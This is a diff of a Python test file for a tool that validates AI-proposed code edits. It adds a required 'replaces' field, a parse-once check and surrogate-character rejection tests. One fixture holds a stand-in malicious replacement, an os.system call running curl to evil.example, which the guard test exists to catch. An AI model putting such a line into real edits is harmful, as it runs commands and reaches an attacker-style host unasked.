@@ -4,6 +4,7 @@ from __future__ import annotations
 
 from typing import Any
 
+import libcst as cst
 import pytest
 from pydantic import ValidationError
 
@@ -53,6 +54,7 @@ PROPOSAL = EditProposal(
     start_line=4,
     end_line=6,
     symbol="google.generativeai.GenerativeModel",
+    replaces="the old lines",
     replacement="def ask(prompt):\n    return CLIENT.models.generate_content(prompt).text",
     rationale="The seed key has no equivalent, so the config is dropped.",
 )
@@ -186,18 +188,55 @@ def test_a_context_says_whether_a_proposed_range_is_inside_it() -> None:
 )
 def test_a_file_is_split_into_the_lines_libcst_numbered(data: bytes, first: str, last: str) -> None:
     """Lines must match libcst's numbering, since the guard checks ranges against its positions."""
-    lines = base.split_lines(data)
+    _, lines = base._parse(data)
 
     assert lines[0] == first
     assert lines[-1] == last
+
+
+def test_a_file_is_parsed_once_however_many_of_its_rows_are_asked(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """The parse is most of a question's cost; each row of a file used to take another."""
+    parsed: list[bytes | str] = []
+    real = cst.parse_module
+
+    def counting(source: bytes | str) -> cst.Module:
+        parsed.append(source)
+        return real(source)
+
+    monkeypatch.setattr(cst, "parse_module", counting)
+    asked, _ = base.questions(
+        findings=[finding(), finding(line=6, kind="method_call")],
+        plans=[],
+        sources={"app.py": SOURCE},
+        pack=PACK,
+        environ={},
+    )
+
+    assert len(asked) == 2
+    assert parsed == [SOURCE]
+
+
+def test_a_file_the_window_reaches_both_ends_of_is_sent_whole() -> None:
+    """`docs/PRIVACY.md` says so: 20 lines either side of a call in a 3-line file is all of it."""
+    source = b"import google.generativeai as genai\n\nmodel = genai.GenerativeModel('m')\n"
+    [asked], _ = base.questions(
+        findings=[finding(line=3)], plans=[], sources={"app.py": source}, pack=PACK, environ={}
+    )
+
+    assert (asked.context.start_line, asked.context.end_line) == (1, 3)
+    assert asked.context.text == source.decode()
 
 
 def test_a_unicode_line_separator_is_not_a_line_break() -> None:
     """`str.splitlines` also breaks on U+2028, U+2029 and form feed, renumbering later lines."""
     data = 'NOTE = "a\u2028b"\nx = 1\n'.encode()
 
-    assert base.split_lines(data) == ['NOTE = "a\u2028b"\n', "x = 1\n"]
-    assert len(data.decode().splitlines()) == 3
+    text = data.decode()
+
+    assert base.split_lines(text) == ['NOTE = "a\u2028b"\n', "x = 1\n"]
+    assert len(text.splitlines()) == 3
 
 
 def test_the_table_of_bails_a_model_is_never_asked_about_is_the_documented_one() -> None:
@@ -229,6 +268,7 @@ def test_a_proposal_holds_a_path_that_climbs_out_of_the_repository() -> None:
         start_line=1,
         end_line=1,
         symbol="not a qualified name at all",
+        replaces="",
         replacement="import os; os.system('curl evil.example')",
         rationale="This is what the guard has to be able to point at.",
     )
@@ -244,6 +284,19 @@ def test_a_proposal_holds_a_path_that_climbs_out_of_the_repository() -> None:
         pytest.param({"path": "   "}, "path is empty", id="blank-path"),
         pytest.param({"symbol": ""}, "symbol is empty", id="blank-symbol"),
         pytest.param({"rationale": "\n"}, "rationale is empty", id="blank-rationale"),
+        pytest.param({"path": "a\ud800.py"}, "path holds a lone surrogate", id="surrogate-path"),
+        pytest.param({"symbol": "s\udfff"}, "symbol holds a lone surrogate", id="surrogate-symbol"),
+        pytest.param(
+            {"replacement": "x = '\ud83d'"},
+            "replacement holds a lone surrogate",
+            id="surrogate-new",
+        ),
+        pytest.param(
+            {"replaces": "x = '\ud83d'"}, "replaces holds a lone surrogate", id="surrogate-old"
+        ),
+        pytest.param(
+            {"rationale": "\ud800"}, "rationale holds a lone surrogate", id="surrogate-why"
+        ),
     ],
 )
 def test_a_proposal_that_cannot_be_held_is_refused(overrides: dict[str, Any], message: str) -> None:
@@ -253,6 +306,7 @@ def test_a_proposal_that_cannot_be_held_is_refused(overrides: dict[str, Any], me
         "start_line": 4,
         "end_line": 6,
         "symbol": "google.generativeai.GenerativeModel",
+        "replaces": "model = genai.GenerativeModel()",
         "replacement": "pass",
         "rationale": "because",
     }
@@ -260,6 +314,21 @@ def test_a_proposal_that_cannot_be_held_is_refused(overrides: dict[str, Any], me
 
     with pytest.raises(ValidationError, match=message):
         EditProposal(**fields)
+
+
+def test_a_proposal_that_does_not_say_what_it_replaces_is_not_held() -> None:
+    """The quote is required: a proposal with none cannot be checked against what was sent."""
+    with pytest.raises(ValidationError, match="replaces"):
+        EditProposal.model_validate(
+            {
+                "path": "app.py",
+                "start_line": 4,
+                "end_line": 6,
+                "symbol": "google.generativeai.GenerativeModel",
+                "replacement": "pass",
+                "rationale": "because",
+            }
+        )
 
 
 @pytest.mark.parametrize("line", [0, -1])
@@ -271,6 +340,7 @@ def test_a_proposal_numbers_its_lines_from_one(line: int) -> None:
             start_line=line,
             end_line=6,
             symbol="google.generativeai.GenerativeModel",
+            replaces="model = genai.GenerativeModel()",
             replacement="pass",
             rationale="because",
         )
